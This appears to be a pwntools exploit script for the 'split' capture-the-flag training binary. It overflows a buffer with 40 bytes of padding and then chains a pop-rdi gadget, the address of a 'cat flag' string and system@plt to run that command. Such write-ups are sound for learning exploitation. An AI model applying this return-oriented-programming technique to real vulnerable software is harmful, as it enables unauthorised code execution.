from pwn import *

p = process('./split')

binary = ELF('./split')

system = binary.symbols['system']
log.info('System : {}'.format(hex(system)))

payload = 'A' * 40
payload += p64(0x00000000004007c3) #pop, rdi , ret
payload += p64(0x0000000000601060) #address cat flag 
payload += p64(0x000000000040074b) #system@plt pada usefulFUnction

p.sendline(payload)
p.interactive()
